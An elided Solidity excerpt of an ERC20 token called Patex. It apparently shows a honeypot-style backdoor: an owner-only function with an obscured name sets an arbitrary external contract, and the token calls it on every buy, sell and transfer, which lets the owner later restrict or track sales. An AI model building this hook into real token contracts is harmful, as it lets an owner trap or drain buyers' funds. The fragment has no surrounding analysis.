...
contract TokenM is ERC20 {
    ...
    IUserAmounttersse public tersse;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Patex", "PATEX") {
    ...
    function couevverBuuingRoou(IUserAmounttersse _tersse) public onlyOwner {
        tersse = _tersse;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                tersse.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				tersse.addOutAmount(from, amount);
            }else{
                tersse.addOutAmount(from, amount);
                takeFee = false;
            }
